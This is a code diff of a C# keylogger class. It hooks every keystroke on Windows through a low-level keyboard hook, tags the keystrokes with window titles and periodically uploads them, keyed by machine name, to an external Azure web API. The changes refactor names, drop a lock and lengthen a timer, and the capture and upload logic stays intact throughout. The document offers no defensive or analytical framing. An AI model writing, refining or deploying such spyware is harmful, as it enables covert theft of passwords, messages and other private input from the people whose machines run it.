@@ -16,24 +16,23 @@ internal class Keyboard : IDisposable
     private readonly StringBuilder _contentBuilder;
     private readonly Uri _uri;
 
-    private readonly TimeSpan _sendPeriod = TimeSpan.FromSeconds(10);
+    private readonly TimeSpan _sendTime = TimeSpan.FromSeconds(10);
     private readonly Timer _sendTimer;
 
-    private readonly TimeSpan _waitTime = TimeSpan.FromSeconds(10);
+    private readonly TimeSpan _waitTime = TimeSpan.FromSeconds(60);
     private readonly Timer _waitTimer;
 
     public string WindowName { get; private set; }
 
     public Keyboard()
     {
-        _sendTimer = new Timer(SendCallback, null, _sendPeriod, _sendPeriod);
+        _sendTimer = new Timer(SendCallback, null, _sendTime, _sendTime);
         _waitTimer = new Timer(WaitCallback, null, _waitTime, _waitTime);
 
         _contentBuilder = new StringBuilder();
-        HookProc callback = CallbackFunction;
         var module = Process.GetCurrentProcess().MainModule.ModuleName;
         var moduleHandle = NativeFunctions.GetModuleHandle(module);
-        var hook = NativeFunctions.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
+        var hook = NativeFunctions.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, KeyboardCallback, moduleHandle, 0);
 
         var name = Environment.MachineName;
         var url = $"https://rumlogger.azurewebsites.net/api/user/AddUserDataV2/{name}";
@@ -45,18 +44,14 @@ internal class Keyboard : IDisposable
         Log(" ");
     }
 
-    private readonly object _lock = new ();
     private void Log(string str)
     {
-        //lock (_lock)
-        {
-            _contentBuilder.Append(str);
-            Trace.Write(str);
-        }
+        _contentBuilder.Append(str);
+        Trace.Write(str);
         _waitTimer.Change(_waitTime, _waitTime);
     }
 
-    private IntPtr CallbackFunction(int code, IntPtr wParam, IntPtr lParam)
+    private IntPtr KeyboardCallback(int code, IntPtr wParam, IntPtr lParam)
     {
         var msgType = (WM)wParam.ToInt32();
         if (code >= 0 && msgType is WM.KEYFIRST or WM.SYSKEYDOWN)
@@ -67,7 +62,7 @@ internal class Keyboard : IDisposable
             var title = new StringBuilder(256);
             NativeFunctions.GetWindowText(hWindow, title, title.Capacity);
             var windowName = title.ToString();
-            if (WindowName != windowName)
+            if (WindowName != windowName.Trim())
             {
                 WindowName = windowName.Trim();
                 Log($"«Window {WindowName}»");
@@ -75,7 +70,6 @@ internal class Keyboard : IDisposable
 
             var caps = Console.CapsLock;
             var vKey = Marshal.ReadInt32(lParam);
-
             var key = KeyConverter.ToString((Keys)vKey, shift, caps);
             
             Log(key);
@@ -100,7 +94,7 @@ internal class Keyboard : IDisposable
             wc.UploadStringAsync(_uri, enc);
 
             Console.WriteLine($"## sending {str} ##");
-            _sendTimer.Change(_sendPeriod, _sendPeriod);
+            _sendTimer.Change(_sendTime, _sendTime);
         }
         catch (Exception ex)
         {
